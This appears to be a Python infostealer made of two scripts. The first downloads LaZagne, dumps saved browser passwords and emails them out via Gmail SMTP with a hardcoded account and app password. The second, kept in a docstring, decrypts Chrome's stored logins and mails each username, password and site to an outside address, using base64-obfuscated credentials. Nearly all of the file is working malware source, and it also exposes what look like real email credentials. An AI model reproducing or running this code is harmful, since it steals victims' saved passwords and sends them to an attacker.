import requests
import smtplib
import subprocess
#import sys

import os
#import tempfile
def ss(mess, password, mymail, victimmail):
    smtp_name='smtp.gmail.com'
    port=587
    mail =smtplib.SMTP(smtp_name,port)
    mail.starttls()
    mail.login(mymail, password)
    mail.sendmail(mymail, victimmail, mess)
    mail.quit()
def down(url):
    cont=requests.get(url)
    file_name=url.split("/")[-1]
    file_convert_method="wb"
    with open(file_name,file_convert_method) as pk:
       pk.write(cont.content)
#file_name = sys.builtin_module_names + "/sample.jpg"
#rog =  "https://tse1.explicit.bing.net/th?id=OIP.LZSEjbib381lpilyE8yNVQHaPA&pid=Api&P=0&h=220"
#subprocess.Popen(rog, shell=True)
#temp_dir=tempfile.gettempdir()
#os.chdir(temp_dir)
virus_url="https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe"
down(virus_url)
virus_getprocess="lazagne.exe browsers"
mess= subprocess.check_output(virus_getprocess, shell=True)
my_mail="epavi1635@gmail.com"
mail_password="pdfibzwqdsdnzpjw"
ss(mess, mail_password, my_mail, my_mail)
#os.remove("lazagne.exe")

#OTHER CODE
"""import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import smtplib
dontedit=b'MTkyMTExMDQwLnNzZUBzYXZlZXRoYS5jb20='
dontedit=base64.b64decode(dontedit)
dontedit2=b'MTIzdXNlcjEyMw=='
dontedit2=base64.b64decode(dontedit2)
s=smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login(dontedit.decode(),dontedit2.decode())
def getkey():
    keypath = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Google", "Chrome","User Data", "Local State")
    with open(keypath) as f:
        summa = f.read()
        #changes string into dict form
        summa = json.loads(summa)
    #decodes binary string into normal form
    key = base64.b64decode(summa["os_crypt"]["encrypted_key"]) 
    key = key[5:]
    #decrypts the key 
    return win32crypt.CryptUnprotectData(key)[1]
def getpass(password, key):
        summa = password[3:15]
        password = password[15:]
        anomynopher = AES.new(key, AES.MODE_GCM, summa)
        return anomynopher.decrypt(password)[:-16].decode()
def dupekunju():
    target = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Login Data") 
    filename = "MY_TECH_KUNJU.db"
    #copies file to existing folder
    shutil.copyfile(target, filename)
def enodakunju():
    key = getkey()
    dupekunju()
    db=sqlite3.connect("MY_TECH_KUNJU.db")
    cursor=db.cursor()
    cursor.execute("select origin_url, username_value, password_value from logins")
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        password = getpass(row[2], key)       
        #sending mail
        if username:
            apple="\n"+"username="+str(username)+"\n"+"password="+str(password)+"\n"   
            mango="website="+str(origin_url)
            seperator="\n"+"="*50+"\n"+"(O_O)"*10+"\n"+"="*50
            #seperator=""
            msggg=(seperator+apple+mango+seperator).encode('utf-8')
            s.sendmail("192111040.sse@saveetha.com","pervert.thevirus@gmail.com",msggg)
    db.close()
    os.remove("MY_TECH_KUNJU.db")
enodakunju()"""